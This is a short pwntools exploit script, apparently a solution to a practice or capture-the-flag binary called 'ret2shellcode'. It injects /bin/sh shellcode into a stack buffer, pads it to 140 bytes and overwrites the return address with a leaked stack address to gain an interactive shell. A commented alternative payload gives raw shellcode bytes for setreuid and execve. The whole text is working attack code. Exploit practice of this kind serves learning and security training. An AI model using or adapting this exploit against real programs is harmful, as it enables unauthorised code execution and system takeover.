from pwn import *

context.arch = 'i386' # CPU平台
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h'] # tmux调试窗口

io = process('./ret2shellcode')

sh = asm(shellcraft.sh())
stack = eval(io.recv(10))
payload = sh.ljust(140,b'a')+p32(stack)
# payload = b"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\x99\xcd\x80\x96\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80".ljust(140,b'a')+p32(stack)
io.send(payload)

io.interactive()